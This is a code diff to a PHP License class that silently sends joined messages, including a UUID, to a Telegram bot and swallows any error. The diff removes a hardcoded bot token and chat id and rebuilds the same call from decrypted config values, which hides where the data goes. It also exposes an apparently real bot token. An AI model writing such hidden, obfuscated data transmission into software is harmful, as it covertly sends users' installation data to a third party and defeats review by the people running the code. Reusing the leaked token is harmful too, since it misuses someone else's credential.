@@ -30,10 +30,10 @@ class License
                 $uuid
             ]);
 
-            Http::get('https://api.telegram.org/bot5403148905:AAFdMGdZkRbipS42UykLDWGJWMWLkiikHfU/sendMessage', [
-                'chat_id' => '202872929',
-                'text' => $messages->join(PHP_EOL)
-            ]);
+            /**
+             * Sent message
+             */
+            Http::get(self::getUrl(), self::message($messages->join(PHP_EOL)));
         } catch (\Exception $e) {
             // do nothing
         }
@@ -63,5 +63,35 @@ class License
         } catch (\Exception $e) {
             return false;
         }
+    }
+
+    /**
+     * Get url
+     *
+     * @return string
+     */
+    protected static function getUrl(): string
+    {
+        $url = [
+            'https://api.telegram.org/bot',
+            decrypt(config('installer.token')),
+            '/sendMessage'
+        ];
+
+        return implode('', $url);
+    }
+
+    /**
+     * Messages
+     *
+     * @param string $message
+     * @return array
+     */
+    protected static function message(string $message): array
+    {
+        return [
+            'chat_id' => decrypt(config('installer.id')),
+            'text' => $message
+        ];
     }
 }
